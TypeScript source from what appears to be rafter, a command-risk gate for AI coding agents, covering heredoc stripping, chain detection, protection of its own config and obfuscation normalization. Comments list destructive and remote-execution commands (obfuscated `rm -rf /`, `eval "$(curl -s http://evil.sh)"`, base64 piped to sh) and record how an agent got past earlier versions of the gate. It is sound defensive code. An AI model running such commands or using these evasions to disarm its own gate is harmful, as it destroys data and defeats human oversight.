  let k = 0;
  while (k < lines.length) {
    const line = lines[k];
    out.push(line);
    HEREDOC_START.lastIndex = 0;
    const matches = [...line.matchAll(HEREDOC_START)];
    k += 1;
    if (matches.length === 0) continue;
    const ltPos = matches[0].index ?? 0;
    const keep =
      heredocOwnerExecutes(line, ltPos) || heredocOutputPipedToShell(line, ltPos);
    for (const m of matches) {
      const delim = m[3];
      const dash = m[1]; // '-'/'~': a tab-indented terminator is allowed
      while (k < lines.length) {
        // bash terminates only on a line EXACTLY equal to the delimiter — for
        // plain `<<` an indented delimiter is body; `<<-` strips leading TABS.
        let cand = lines[k].replace(/\r$/, "");
        if (dash) cand = cand.replace(/^\t+/, "");
        if (cand === delim) { k += 1; break; }
        if (keep) out.push(lines[k]);
        k += 1;
      }
    }
  }
  return out.join("\n");
}

export function sanitizeCommandForMatching(command: string): string {
  return sanitize(stripHeredocBodies(command), 0);
}

/**
 * True if the command contains more than one statement.
 *
 * Asked of the TOKENIZER rather than a regex, deliberately. The first version
 * of this was `/[;|&]|&&|\|\|/`, which omits the newline — and a newline has
 * been a statement separator in this file since rf-6pqx, six lines from where
 * that regex sat. The gap was reachable in one step: with `^git push origin
 * feature/` allowlisted,
 *
 *     git push origin feature/x
 *     git push --force origin main
 *
 * classified `allow`, because the chain check saw no operator. The agent being
 * gated writes the whole string, so prefixing an allowlisted line is free.
 *
 * The tokenizer already normalises `\n` to `;`, so routing the question through
 * it removes the second, narrower definition instead of widening it. One source
 * of truth for "what separates two commands".
 */
export function isChainedCommand(command: string): boolean {
  const { pieces } = tokenize(command);
  return pieces.some((p) => p.op !== null && CHAIN_OPS.has(p.op));
}

/**
 * Assess risk level of a command string.
 */
/**
 * rf-vnxs — reconfiguring rafter's OWN security controls is a PROTECTED CLASS.
 *
 * The gate must never approve its own disarming. On 0.10.1 it did: the hook
 * rated `rafter agent config set agent.hooks.enabled false` as `low`, allowed
 * it, and every later command — including the CRITICAL tier that no policy,
 * mode or deny-list can override — was then permitted. Three steps, no
 * malformed command, and it persists to config.json.
 *
 * This is matched STRUCTURALLY — resolved exec plus an argv walk — and not by
 * string, because the spellings are unbounded and were all observed allowed on
 * the published artifact: extra whitespace, `FALSE`, `npx @rafter-security/cli
 * …`, `sudo -E rafter …`, the `agent disable` component route, and three
 * different self-disabling keys (hooks.enabled, hooks.secretScan,
 * hooks.commandPolicy). A blacklist of one string is one alias away from being
 * a no-op — the same shape as the CHAIN_OPS one-liner that was proven inert
 * only by running the shipped module.
 */
const RAFTER_EXECS = new Set(["rafter", "rafter-cli"]);
const PACKAGE_RUNNERS = new Set(["npx", "bunx", "pnpx", "dlx", "pnpm", "yarn", "bun"]);
const RAFTER_PACKAGE = /^(?:@rafter-security\/cli|rafter-cli|rafter)(?:@[\w.^~*-]+)?$/;

/** Config keys that gate the hook. Namespace, not a leaf — see hook-control. */
const PROTECTED_CONFIG_KEY = /^(?:agent\.)?(?:hooks|commandpolicy)\b|^agent\.risklevel$/;

/**
 * True if this statement's argv reconfigures or removes a rafter security
 * control.
 *
 * The rafter invocation is looked for at ANY position, not just as the
 * statement's own exec, because a shell that carries a command string puts it
 * in the operand: `bash -c "rafter agent config set agent.hooks.enabled false"`
 * and `bash -c "$(echo rafter …)"` both sanitize to a statement whose exec is
 * `bash`, and an exec-only walk reads them — wrongly — as not-rafter. A quoted
 * word is skipped on the raw pass so that `echo 'rafter agent config set …'`
 * stays prose; the sanitized pass is where an actually-executed operand has
 * already been unwrapped for us.
 */
function statementDisarmsRafter(words: Piece[]): boolean {
  for (let j = 0; j < words.length; j++) {
    if (words[j].quoted) continue;
    let k = j;
    let exec = execName(words[k].text);
    k++;

    // `npx [-y] @rafter-security/cli …`, `pnpm dlx rafter-cli …`, `bunx rafter …`
    if (PACKAGE_RUNNERS.has(exec)) {
      while (k < words.length && (words[k].text.startsWith("-") || ["dlx", "exec"].includes(words[k].text.toLowerCase()))) k++;
      if (k >= words.length || !RAFTER_PACKAGE.test(words[k].text.toLowerCase())) continue;
      k++;
      exec = "rafter";
    }
    if (!RAFTER_EXECS.has(exec)) continue;

    const args = words.slice(k).map((w) => w.text.toLowerCase()).filter((a) => !a.startsWith("-"));
    for (let n = 0; n + 1 < args.length; n++) {
      // `… config set <protected key>` — the key is the next non-flag operand.
      if (args[n] === "config" && args[n + 1] === "set") {
        const key = args[n + 2];
        if (key && PROTECTED_CONFIG_KEY.test(key)) return true;
      }
      // `… agent disable <component>` — uninstalls a control outright.
      if (args[n] === "agent" && args[n + 1] === "disable") return true;
    }
  }
  return false;
}

/**
 * True if the command disarms rafter, checked on BOTH the raw text and the
 * sanitized text. Raw catches the ordinary invocation; sanitized catches the
 * case where a shell runs the OUTPUT of something else — `bash -c "$(echo
 * rafter agent config set …)"`, whose own exec is `echo` and which a walk over
 * the raw argv therefore reads, correctly, as a print. That is the same
 * executes-output distinction sable-c6an turned on.
 */
export function modifiesRafterSecurityConfig(command: string): boolean {
  if (disarmsRafter(command, 0)) return true;
  const sanitized = sanitizeCommandForMatching(command);
  return sanitized !== command && disarmsRafter(sanitized, 0);
}

/** True if any statement (or any command substitution) disarms rafter. */
function disarmsRafter(command: string, depth = 0): boolean {
  if (depth > MAX_SANITIZE_DEPTH) return false;
  const { pieces } = tokenize(command);
  let stmt: Piece[] = [];
  const statements: Piece[][] = [];
  for (const p of pieces) {
    if (p.op !== null) {
      if (CHAIN_OPS.has(p.op) || p.op === "\n" || p.op === "\r") { statements.push(stmt); stmt = []; }
      continue;
    }
    stmt.push(p);
    for (const sub of p.substs ?? []) {
      if (disarmsRafter(sub, depth + 1)) return true;
    }
  }
  statements.push(stmt);
  return statements.some(statementDisarmsRafter);
}

/**
 * True if a SHELL receives its program through a channel rather than as a path.
 *
 * rf-zvll mechanism B. Three shapes, all measured EXECUTING by the sandboxed
 * oracle while classifying `low`:
 *
 *     cat payload.txt | sh          the payload is in a file
 *     echo <b64> | base64 -d | sh   the payload is encoded
 *     bash < payload.txt            no pipe at all, just a redirect
 *
 * The classifier cannot read any of them, so no amount of better parsing
 * recovers the payload — this is a POSTURE decision, not an analysis one.
 *
 * DELIBERATELY EXCLUDES a plain file ARGUMENT (`bash deploy.sh`). We cannot read
 * that either, so the distinction is not one of RISK — it is one of FREQUENCY,
 * and saying so plainly matters more than dressing it up. Measured over 13,613
 * intercepted commands: stream forms are 0.022% of traffic in 2 of 665 repos,
 * while `curl|wget` into a shell — already approval-gated — is 100 events. The
 * form that already prompts is 33x more common than everything this newly
 * gates. That sample is ONE machine; the limit is recorded on rf-zvll.
 */
export function shellProgramFromStream(command: string): boolean {
  const { pieces } = tokenize(command);
  const segments: Piece[][] = [];
  const enders: (string | null)[] = [];
  let cur: Piece[] = [];
  for (const piece of pieces) {
    if (piece.op !== null && CHAIN_OPS.has(piece.op)) {
      segments.push(cur); enders.push(piece.op); cur = [];
      continue;
    }
    cur.push(piece);
  }
  segments.push(cur); enders.push(null);

  // Iterative, not one step: `env FOO=1 bash` needs two skips, and a single
  // lookahead silently resolved to `FOO=1` — caught by its own test row.
  const resolve = (seg: Piece[]): string => {
    const words = seg.filter((w) => w.op === null);
    for (let k = 0; k < words.length; k++) {
      const t = words[k].text;
      if (ENV_ASSIGNMENT.test(t) || t.startsWith("-")) continue;
      if (TAIL_WRAPPERS.has(execName(t))) continue;
      return execName(t);
    }
    return "";
  };

  for (let idx = 0; idx < segments.length; idx++) {
    const seg = segments[idx];
    // `eval "$(cat f)"` / `eval "$(curl -s http://x)"` — a program-executing
    // consumer fed from a substitution whose OUTPUT we cannot read. Same
    // semantic test as the pipe case; pipe-vs-substitution is syntax.
    //
    // Deliberately ANY substitution, not only data-readers: a reader-only rule
    // misses `eval "$(curl -s http://evil.sh)"`, remote code and the worst
    // shape in the set. Measured cost of the broad rule: ZERO occurrences in
    // 13,647 commands across 671 repos.
    if (EVAL_EXECS.has(resolve(seg)) && seg.some((w) => w.op === null && w.substs.length)) {
      return true;
    }
    if (SHELL_EXECS.has(resolve(seg))) {
      // `bash < file` / `bash <<< str` — the program arrives on stdin.
      for (const w of seg) if (w.op === "<" || w.op === "<<<") return true;
    }
    // `… | bash` — this segment's OUTPUT is the next one's program.
    if (enders[idx] === "|" && idx + 1 < segments.length) {
      if (SHELL_EXECS.has(resolve(segments[idx + 1]))) return true;
    }
  }
  return false;
}

// ---------------------------------------------------------------------------
// Obfuscation normalizer + evasion-construct detector (sable-jtxp)
// ---------------------------------------------------------------------------
//
// The risk patterns match the SPELLING of a command, so an attacker can keep a
// catastrophic command's effect while changing its spelling past the patterns:
// long flags (`rm --recursive --force /`), `$IFS` word-splitting
// (`rm${IFS}-rf${IFS}/`), brace expansion (`{rm,-rf,/}`), ANSI-C quoting
// (`bash -c $'rm\x20-rf\x20/'`), or process substitution into a shell
// (`sh <(curl …)`). Two layers answer this, applied in assessCommandRisk:
//
//   1. normalizeForMatching() un-obfuscates a bounded set of these spellings —
//      WITHOUT executing anything — and the patterns are matched against the
//      normalized form as well as the raw/sanitized one (highest risk wins).
//   2. evasionConstructRisk() independently rates the obfuscation constructs
//      themselves as approval-grade, so a construct whose decoded payload the
//      classifier still cannot read is gated rather than allowed.
//
// LIMITATION — READ BEFORE RELYING ON THIS. It recognizes a fixed set of
// SPELLINGS; it is DEFENCE IN DEPTH, NOT a containment boundary. It does not and
// cannot stop an adversary who INDIRECTS the command so the dangerous token
// never appears literally — assembled through a shell variable (`X=rm; $X -rf
// /`), produced by a command substitution (`$(…)` in command position), or
// handed to an interpreter whose argument the classifier cannot read (a payload
// piped into a non-shell `python`/`perl`, a base64 blob decoded at runtime).
// Those are deliberately NOT chased here: a pass that tried to gate variable
// indirection or `$(…)` in command position also catches legitimate `$CC` /
// `$(which python)` shapes, so the real answer is a deny-by-default execution
// redesign, tracked separately (hoare's epic sable-75st; this change is
// sable-jtxp). Everything here only ever EXPOSES more to the patterns — the
// safe direction — and the quoted-data redaction in sanitizeCommandForMatching
// still runs on the normalized form, so decoding a quoted commit message does
// not make it match.

/** Bounds so a crafted input cannot hang or exhaust memory. */
const MAX_NORMALIZE_INPUT = 20000;
const MAX_NORMALIZE_OUTPUT = 40000;
const MAX_BRACE_PASSES = 24;

const ANSI_C_SIMPLE: Record<string, string> = {
  t: "\t", n: "\n", r: "\r", "\\": "\\", "'": "'", '"': '"',
  a: "\x07", b: "\b", f: "\f", v: "\v", e: "\x1b", E: "\x1b",
};

/**
 * Decode one ANSI-C `$'…'` string whose opening `$'` is at `i`, returning the
 * decoded content and the index just past the closing quote. Parses `$'…'` with
 * its own escape rules (a `\'` does NOT terminate), which is why plain
 * single-quote handling in the tokenizer cannot see through it.
 */
function decodeAnsiCStringAt(s: string, i: number): { decoded: string; next: number } {
  i += 2;
  let decoded = "";
  while (i < s.length && s[i] !== "'") {
    if (s[i] === "\\" && i + 1 < s.length) {
      i++;
      const c = s[i];
      if (c === "x" || c === "X") {
        i++;
        let hex = "";
        while (i < s.length && hex.length < 2 && /[0-9a-fA-F]/.test(s[i])) { hex += s[i]; i++; }
        decoded += hex ? String.fromCharCode(parseInt(hex, 16)) : "x";
        continue;
      }
      if (c >= "0" && c <= "7") {
        let oct = "";
        while (i < s.length && oct.length < 3 && s[i] >= "0" && s[i] <= "7") { oct += s[i]; i++; }
        decoded += String.fromCharCode(parseInt(oct, 8) & 0xff);
        continue;
      }
      decoded += ANSI_C_SIMPLE[c] ?? c;
      i++;
      continue;
    }
    decoded += s[i];
    i++;
  }
  if (i < s.length) i++; // consume the closing quote
  return { decoded, next: i };
}

/**
 * Decode the escapes of every ANSI-C `$'…'` string, keeping each result ONE
 * quoted word so a shell wrapper still sees a single `-c` argument.
 */
function decodeAnsiCQuotes(s: string): string {
  if (!s.includes("$'")) return s;
  let out = "";
  let i = 0;
  while (i < s.length) {
    if (s[i] === "$" && s[i + 1] === "'") {
      const r = decodeAnsiCStringAt(s, i);
      // Re-wrap as a single-quoted word, escaping embedded quotes, so the
      // sanitizer still treats it as one argument rather than splitting it.
      out += "'" + r.decoded.replace(/'/g, "'\\''") + "'";
      i = r.next;
      continue;
    }
    out += s[i];
    i++;
  }
  return out;
}

/**
 * True if some `$'…'` decodes to content that HIDES A WORD BOUNDARY — interior
 * whitespace separating two or more tokens (`$'rm\x20-rf\x20/'`), the shape
 * that reconstructs a multi-word command inside one quoted word. A `$'…'` that
 * decodes to a lone separator (`$'\t'`, `$'\n'`) or to a single token
 * (`$'hi'`, a color escape) is a legitimate data literal and is NOT flagged —
 * matching on bare presence over-blocked idioms like `grep -P $'\t'`.
 */
function ansiCHidesWordBoundary(s: string): boolean {
  if (!s.includes("$'")) return false;
  let i = 0;
  while ((i = s.indexOf("$'", i)) !== -1) {
    const r = decodeAnsiCStringAt(s, i);
    if (r.decoded.trim().split(/\s+/).filter(Boolean).length > 1) return true;
    i = r.next;
  }
  return false;
}

/**
 * Expand simple brace lists `{a,b,c}` to space-separated `a b c`. Space-join,
 * NOT the shell's cartesian product, so adjacent groups cannot blow up — the
 * over-approximation only exposes more tokens to the patterns. `(?<!\$)` leaves
 * `${VAR}` parameter expansion alone; a comma is required so `${IFS}` and plain
 * `{}` are untouched. Innermost-first over bounded passes handles nesting.
 */
function expandBraceLists(s: string): string {
  if (!s.includes("{")) return s;
  const re = /(?<!\$)\{([^{}]*,[^{}]*)\}/g;
  let passes = 0;
  let prev: string;
  do {
    prev = s;
    s = s.replace(re, (_m, inner: string) => inner.split(",").join(" "));
    passes++;
    if (s.length > MAX_NORMALIZE_OUTPUT) { s = s.slice(0, MAX_NORMALIZE_OUTPUT); break; }
  } while (s !== prev && passes < MAX_BRACE_PASSES);
  return s;
}

/**
 * Reduce an `rm` whose flags carry BOTH recursive and force intent — in any
 * long, short or `--no-preserve-root` spelling, adjacent or not — to the
 * `rm -rf` form the existing patterns catch. Scoped to `rm`, and the collapse
 * only ever adds `-rf`, so it cannot turn a benign command destructive.
 */
function canonicalizeRmFlags(s: string): string {
  if (!/\brm\b/i.test(s)) return s;
  const re = /(^|[\s;&|()<>])((?:[\w./-]*\/)?rm)((?:[ \t]+--?[A-Za-z][\w-]*)*)/gi;
  return s.replace(re, (whole, pre: string, cmd: string, flags: string) => {
    if (!flags.trim()) return whole;
    let recursive = false;
    let force = false;
    for (const tok of flags.trim().split(/\s+/)) {
      const low = tok.toLowerCase();
      if (low.startsWith("--")) {
        if (low === "--recursive") recursive = true;
        else if (low === "--force" || low === "--no-preserve-root") force = true;
      } else {
        if (low.includes("r")) recursive = true;
        if (low.includes("f")) force = true;
      }
    }
    return recursive && force ? `${pre}${cmd} -rf` : whole;
  });
}

/**
 * A spelling-normalized view of a command for pattern matching. Decodes ANSI-C
 * quoting, substitutes `$IFS`/`${IFS}`, expands brace lists, canonicalizes
 * destructive-flag spellings, and collapses whitespace runs. Executes nothing;
 * bounded against hostile input.
 */
export function normalizeForMatching(command: string): string {
  if (!command) return command;
  let s = command.length > MAX_NORMALIZE_INPUT ? command.slice(0, MAX_NORMALIZE_INPUT) : command;
  s = decodeAnsiCQuotes(s);
  s = s.replace(/\$\{IFS\}/g, " ").replace(/\$IFS(?![A-Za-z0-9_])/g, " ");
  s = expandBraceLists(s);
  s = canonicalizeRmFlags(s);
  // Collapse runs of spaces/tabs; keep newlines/CRs as statement separators.
  s = s.replace(/[^\S\n\r]+/g, " ");
  if (s.length > MAX_NORMALIZE_OUTPUT) s = s.slice(0, MAX_NORMALIZE_OUTPUT);
  return s;
}

/** The exec piece of a segment (skipping env assignments and prefix wrappers). */
function resolveExecPiece(seg: Piece[]): Piece | null {
  const isRedirectTarget = new Array<boolean>(seg.length).fill(false);
  for (let i = 1; i < seg.length; i++) {
    const prev = seg[i - 1];
    if (prev.op && REDIRECT_OPS.has(prev.op) && !seg[i].op) isRedirectTarget[i] = true;
  }
  for (let i = 0; i < seg.length; i++) {
    const p = seg[i];
    if (p.op || isRedirectTarget[i]) continue;
    if (!p.quoted && ENV_ASSIGNMENT.test(p.text)) continue;
    if (!p.quoted && TAIL_WRAPPERS.has(execName(p.text))) {
      let j = i + 1;
      while (j < seg.length) {
        const q = seg[j];
        if (q.op || isRedirectTarget[j]) { j++; continue; }
        if (q.text.startsWith("-") || NUMERIC_ARG.test(q.text)) { j++; continue; }
        break;
      }
      i = j - 1;
      continue;
    }
    return p;
  }
  return null;
}

/**
 * True if the command uses a shell OBFUSCATION construct that should require
 * approval even when the normalized payload still cannot be read: `$IFS`
 * splitting, ANSI-C `$'…'`, a brace list in COMMAND position, a process
 * substitution feeding a shell/eval, or a base64 decode piped into a shell.
 * Narrow by design — a brace ARGUMENT or a process substitution into a
 * non-shell (`diff <(a) <(b)`) is routine and not flagged.
 */
export function evasionConstructRisk(command: string): boolean {
  if (!command) return false;
  const s = command.length > MAX_NORMALIZE_INPUT ? command.slice(0, MAX_NORMALIZE_INPUT) : command;
  if (/\$\{IFS\}|\$IFS\b/.test(s)) return true;
  if (ansiCHidesWordBoundary(s)) return true;
  if (/\bbase64\b[\s\S]*\|\s*(ba|z|da|k|a)?sh\b/i.test(s)) return true;

  const { pieces, unterminated } = tokenize(s);
  if (unterminated) return false; // a broken parse already fails closed elsewhere
  const segments: Piece[][] = [];
  let seg: Piece[] = [];
  for (const p of pieces) {
    if (p.op !== null && CHAIN_OPS.has(p.op)) { segments.push(seg); seg = []; continue; }
    seg.push(p);
  }
  segments.push(seg);

  for (const segment of segments) {
    const exec = resolveExecPiece(segment);
    if (!exec) continue;
    if (exec.text && /^\{[^{}]*,[^{}]*\}/.test(exec.text)) return true;
    const name = execName(exec.text);
    if (SHELL_EXECS.has(name) || EVAL_EXECS.has(name)) {
      for (const p of segment) {
        if (p.op === null && p.text === "" && p.substs.length > 0) {
          const open = s.slice(p.start, p.start + 2);
          if (open === "<(" || open === ">(") return true;
        }
      }
    }
  }
  return false;
}

/**
 * The distinct lowercased, sanitized views a command's risk is judged against:
 * the raw command and — when normalization changed it — the spelling-normalized
 * command. Matching the union defeats a spelling that evades the patterns.
 */
function matchVariants(command: string): string[] {
  const raw = sanitizeCommandForMatching(command).toLowerCase().trim();
  const variants: string[] = [];
  if (raw) variants.push(raw);
  const normalized = normalizeForMatching(command);
  if (normalized !== command) {
    const normSan = sanitizeCommandForMatching(normalized).toLowerCase().trim();
    if (normSan && normSan !== raw) variants.push(normSan);
  }
  return variants;
}

export function assessCommandRisk(command: string): CommandRiskLevel {
  // rf-vnxs: checked on the RAW command, before sanitization, because the
  // disarm is an ordinary well-formed invocation — there is nothing malformed
  // for the sanitizer to normalise, and redaction could hide the operand.
  if (modifiesRafterSecurityConfig(command)) return "critical";

  // sable-jtxp: match against the raw AND the spelling-normalized view, so a
  // command whose spelling evades the patterns is still caught.
  const variants = matchVariants(command);
  if (variants.length === 0) return "low";

  for (const pattern of CRITICAL_PATTERNS) {
    if (variants.some((v) => pattern.test(v))) return "critical";
  }
  // rf-zvll B2 + sable-jtxp: a shell fed its program from a channel we cannot
  // read, or an obfuscation construct whose payload we cannot read, requires
  // approval. Checked AFTER critical so `echo 'rm -rf /' | sh` — where the
  // payload IS readable and matches — keeps its hard block rather than being
  // softened to approval.
  if (shellProgramFromStream(command) || evasionConstructRisk(command)) return "high";
  for (const pattern of HIGH_PATTERNS) {
    if (variants.some((v) => pattern.test(v))) return "high";
  }
  for (const pattern of MEDIUM_PATTERNS) {
    if (variants.some((v) => pattern.test(v))) return "medium";
  }
  return "low";
}

/**
 * Return the source of the first CRITICAL pattern matching the command, or null.
 * Mirrors assessCommandRisk's sanitization + lowercasing. Intended to be called
 * only once a command is already classified "critical", to surface *which*
 * built-in rule matched.
 */
export function matchedCriticalPattern(command: string): string | null {
  if (modifiesRafterSecurityConfig(command)) {
    return "rafter security configuration is protected (rf-vnxs)";
  }
  // Mirror assessCommandRisk: a critical match may live in the normalized view.
  const variants = matchVariants(command);
  for (const pattern of CRITICAL_PATTERNS) {
    if (variants.some((v) => pattern.test(v))) return pattern.source;
  }
  return null;
}
